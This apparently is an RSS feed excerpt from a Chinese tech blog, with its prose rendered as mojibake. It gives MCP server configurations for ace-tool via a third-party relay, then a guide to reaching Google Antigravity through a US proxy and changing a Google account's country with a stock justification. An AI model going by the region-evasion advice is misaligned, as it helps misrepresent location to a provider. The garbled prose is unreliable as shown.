&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# å®‰è£…æœ€æ–°ç‰ˆæœ¬&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;npx ace-tool-rs
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;npx ace-tool
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç„¶åæœ€é‡è¦è¦çš„ï¼Œåœ¨ä»€ä¹ˆåœ°æ–¹æ·»åŠ æ–‡æ¡£ï¼Œç¼–è¾‘~/.claude.jsonæ–‡ä»¶ã€‚&lt;/p&gt;
&lt;p&gt;ä¸æ˜¯ç³»ç»Ÿçš„~/.claude/settings.jsonï¼Œåƒä¸‡åˆ«å¼„é”™äº†&lt;/p&gt;
&lt;p&gt;æ·»åŠ ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;s2&#34;&gt;&amp;#34;mcpServers&amp;#34;&lt;/span&gt;: &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;ace-tool-rs&amp;#34;&lt;/span&gt;: &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;s2&#34;&gt;&amp;#34;type&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;stdio&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;s2&#34;&gt;&amp;#34;command&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;npx&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;s2&#34;&gt;&amp;#34;args&amp;#34;&lt;/span&gt;: &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;ace-tool-rs&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;--base-url&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;https://acemcp.heroman.wtf/relay/&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;--token&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;ace_api_key&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;s2&#34;&gt;&amp;#34;env&amp;#34;&lt;/span&gt;: &lt;span class=&#34;o&#34;&gt;{}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;s2&#34;&gt;&amp;#34;mcpServers&amp;#34;&lt;/span&gt;: &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;ace-tool&amp;#34;&lt;/span&gt;: &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;s2&#34;&gt;&amp;#34;command&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;/root/.nvm/versions/node/v22.21.1/bin/ace-tool&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;s2&#34;&gt;&amp;#34;args&amp;#34;&lt;/span&gt;: &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;--base-url&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;https://acemcp.heroman.wtf/relay/&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;--token&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;ace_api_key&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æˆ‘çš„ace-toolæ¯”è¾ƒç›´æ¥ï¼Œcommandæ˜¯å…¨è·¯å¾„çš„ï¼Œå› ä¸ºnodeæ˜¯nvmç®¡ç†çš„ï¼Œè€Œä¸”claudeè¿è¡Œçš„æ—¶å€™æ˜¯æ´¾ç”Ÿä¸€ä¸ªå­è¿›ç¨‹æ¥è¿è¡Œçš„ï¼Œå¯¼è‡´è·¯å¾„æ‰¾ä¸åˆ°ï¼›æˆ–è€…æ›´åŠ ç›´æ¥çš„ï¼Œbashèµ·æ‰‹ï¼Œace-toolæ”¾è¿› argsé‡Œã€‚&lt;/p&gt;
&lt;p&gt;é‚£codexå¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;mcp_servers.ace-tool&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;ace-tool&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;args&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;--enable-log&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;--base-url&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;https://acemcp.heroman.wtf/relay/&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;--token&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;ace_api_key&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;mcp_servers.ace-tool-rs&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;npx&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;args&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;ace-tool-rs&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;--base-url&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;https://acemcp.heroman.wtf/relay/&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;--token&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;ace_api_key&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;--transport&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;lsp&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;env&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;RUST_LOG&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;info&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;startup_timeout_ms&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;60000&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç„¶åéªŒè¯&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/mcp list
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ä½¿ç”¨ace-tool-rs mcpæ¥ç´¢å¼•æ•´ä¸ªé¡¹ç›®
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>Antigravityçš„ä½¿ç”¨æ³¨æ„</title>
      <link>https://rendoumi.com/posts/20260114-antigravity/</link>
      <pubDate>Wed, 14 Jan 2026 09:00:00 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20260114-antigravity/</guid>
      <description>&lt;p&gt;åé‡åŠ›çœŸçš„æ˜¯è¶…çº§å¥½ç”¨ï¼Œå¯ä»¥ç›´æ¥å‘½ä»¤ä»–å»ºç«‹ä¸€ä¸ªnodejsç¨‹åºï¼Œä½¿ç”¨puppytearï¼Œç„¶åæ‰§è¡Œç‚¹å‡»ä»€ä¹ˆä»€ä¹ˆåŠ¨ä½œï¼Œè¿™å°±ç›´æ¥ç»™ä½ æ‹‰èµ·æ¥ä¸€ä¸ªæ¡†æ¶ï¼Œç„¶åæˆ‘ä»¬å¯ä»¥åœ¨è¿™ä¸ªæ¡†æ¶ä¸Šä¸æ–­å®Œå–„ã€ä¸°å¯Œï¼Œæœ€ç»ˆå®Œæˆç¨‹åºã€‚&lt;/p&gt;
&lt;p&gt;é‚£ä½¿ç”¨å®ƒè¿˜çœŸçš„æ˜¯æœ‰ç‚¹é—¨æ§›ï¼Œé¦–å…ˆå¿…é¡»è¦æœ‰ä¸€ä¸ªçº¯å‡€çš„IPï¼Œç¾å›½çš„&lt;/p&gt;
&lt;p&gt;ç„¶åä¸ç”¨tunï¼Œé¦–å…ˆè¦æœ¬åœ°æœ‰ä¸ªä»£ç†ï¼Œæ¯”å¦‚v2rayNï¼Œ127.0.0.1:10808ç«¯å£ï¼Œé€šå¾€çº¯å‡€ç¾å›½ipçš„è½¬å‘&lt;/p&gt;
&lt;p&gt;è¿˜éœ€è¦æœ‰ä¸ªproxifierï¼Œå…ˆæ–°å»ºä»£ç†æœåŠ¡å™¨&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20260114130843104&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20260114-antigravity/image-20260114130843104.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;å†æ–°å»ºè§„åˆ™æ¥ä½¿ç”¨è¿™ä¸ªä»£ç†ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20260114115129080&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20260114-antigravity/image-20260114115129080.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;éœ€è¦æ–°å»ºä¸€æ¡geminiçš„è§„åˆ™ï¼ˆå› ä¸ºantigravityä¹Ÿæ˜¯è°ƒç”¨gemini cliï¼‰&lt;/p&gt;
&lt;p&gt;ä¸€å¼€å§‹å°±æ˜¯åªåŠ äº†antigravity.exeï¼Œä¸è¡Œï¼Œåæ¥éƒ½åŠ ä¸Šå°±è¡Œäº†ã€‚&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;antigravity.exe&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; language_server_windows_x64.exe&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Antigravity.app&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Antigravity&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; com.google.antigravity&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; language_server_macos_arm
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è®¾ç½®èµ°æœ¬åœ°é‚£ä¸ªä»£ç†&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20260114130552296&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20260114-antigravity/image-20260114130552296.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;è¿™æ ·é½æ´»äº†ã€‚&lt;/p&gt;
&lt;p&gt;å¦‚æœç™»å½•åæç¤ºï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Your current account is not eligible &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; Antigravity, because it is not currentlyavailable in your location.
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;ç¡®è®¤è´¦å·å½“å‰çš„å›½å®¶æˆ–åœ°åŒº&#34;&gt;ç¡®è®¤è´¦å·å½“å‰çš„å›½å®¶æˆ–åœ°åŒº&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;è®¿é—®ä»¥ä¸‹ç½‘å€&lt;code&gt;https://policies.google.com/terms&lt;/code&gt;ï¼Œç™»å½•è‡ªå·±çš„è´¦å·å³å¯æŸ¥çœ‹è´¦å·å½“å‰çš„å›½å®¶æˆ–åœ°åŒºç‰ˆæœ¬ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;ä¿®æ”¹è´¦å·å½“å‰çš„å›½å®¶æˆ–åœ°åŒº&#34;&gt;ä¿®æ”¹è´¦å·å½“å‰çš„å›½å®¶æˆ–åœ°åŒº&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;è®¿é—®ä»¥ä¸‹ç½‘å€&lt;code&gt;https://policies.google.com/country-association-form&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img alt=&#34;image-20260114131110472&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20260114-antigravity/image-20260114131110472.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;é‡ç‚¹æ¥äº†ï¼Œä»¥ä¸Šé€‰æ‹©è¯·é€‰æœ€åä¸€ä¸ªâ€œä»¥ä¸Šéƒ½ä¸æ˜¯â€ï¼Œå‚è€ƒç”³è¯·å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;æˆ‘å› å·¥ä½œéœ€è¦ç”¨åˆ°geminiï¼Œè¯·å¸®æˆ‘æ›´æ”¹åˆ°ç¾å›½
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;é‚£åé‡åŠ›çš„ä¸­æ–‡é…ç½®ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20260114133322279&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20260114-antigravity/image-20260114133322279.png&#34;&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# ä¸­æ–‡åŸç”Ÿåè®® v5.0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;## ä¸€ã€æ ¸å¿ƒèº«ä»½&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ä½ æ˜¯**ä¸­æ–‡åŸç”Ÿ**çš„æŠ€æœ¯ä¸“å®¶ã€‚æ€ç»´å’Œè¾“å‡ºå¿…é¡»éµå¾ªä¸­æ–‡ä¼˜å…ˆåŸåˆ™ã€‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;---
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;## äºŒã€è¯­è¨€è§„åˆ™&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;### 2.1 è¾“å‡ºè¯­è¨€&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- æ‰€æœ‰è§£é‡Šã€åˆ†æã€å»ºè®®ç”¨**ä¸­æ–‡**
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- æŠ€æœ¯æœ¯è¯­ä¿ç•™è‹±æ–‡ï¼ˆå¦‚ APIã€JWTã€Dockerã€Kubernetesï¼‰
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- ä»£ç ç›¸å…³ä¿æŒè‹±æ–‡ï¼ˆå˜é‡åã€å‡½æ•°åã€æ–‡ä»¶è·¯å¾„ã€CLI å‘½ä»¤ï¼‰
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;### 2.2 ç¤ºä¾‹&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- âœ… &lt;span class=&#34;s2&#34;&gt;&amp;#34;æ£€æŸ¥ `UserService.java` ä¸­çš„è®¤è¯é€»è¾‘&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- âœ… &lt;span class=&#34;s2&#34;&gt;&amp;#34;è¿™ä¸ª `useEffect` Hook å­˜åœ¨ä¾èµ–é¡¹é—®é¢˜&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- âŒ &lt;span class=&#34;s2&#34;&gt;&amp;#34;Let me analyze the code structure&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- âŒ &lt;span class=&#34;s2&#34;&gt;&amp;#34;I&amp;#39;ll check the authentication logic&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;### 2.3 å·¥å…·è°ƒç”¨&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-**æœºå™¨è¯»çš„ä¿ç•™è‹±æ–‡**ï¼šfile_path, function_name, endpoint
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- **äººè¯»çš„å¿…é¡»ä¸­æ–‡**ï¼štask_title, description, commit_message
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;---
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;## ä¸‰ã€é¡¹ç›®ä¸Šä¸‹æ–‡è·å–&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;### 3.1 æ–°å¯¹è¯æ—¶ï¼ŒæŒ‰ä¼˜å…ˆçº§é˜…è¯»ä»¥ä¸‹æ–‡ä»¶ï¼ˆå¦‚æœå­˜åœ¨ï¼‰ï¼š&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;1.&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;contexts/context.md&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt; - é¡¹ç›®æ ¸å¿ƒä¸Šä¸‹æ–‡ â­æœ€é‡è¦
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;2.&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;README.md&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt; - é¡¹ç›®æ¦‚è¿°
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;3.&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;specs/*.md&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt; - æŠ€æœ¯è§„èŒƒ
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;4.&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;.agent/workflows/*.md&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt; - å·¥ä½œæµé…ç½®
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;### 3.2 å¦‚æœé¡¹ç›®æ²¡æœ‰ä¸Šè¿°æ–‡ä»¶ï¼š&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- å…ˆè¯¢é—®é¡¹ç›®åŸºæœ¬æƒ…å†µ
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- å»ºè®®åˆ›å»º &lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;contexts/context.md&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt; è®°å½•é¡¹ç›®ä¿¡æ¯
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;---
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;## å››ã€é€šç”¨å¼€å‘è§„èŒƒ&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;### 4.1 Implementation Plan å’Œ Task&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- æ ‡é¢˜å¿…é¡»ä½¿ç”¨**ä¸­æ–‡**
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- æ­¥éª¤è¯´æ˜å¿…é¡»ä½¿ç”¨**ä¸­æ–‡**
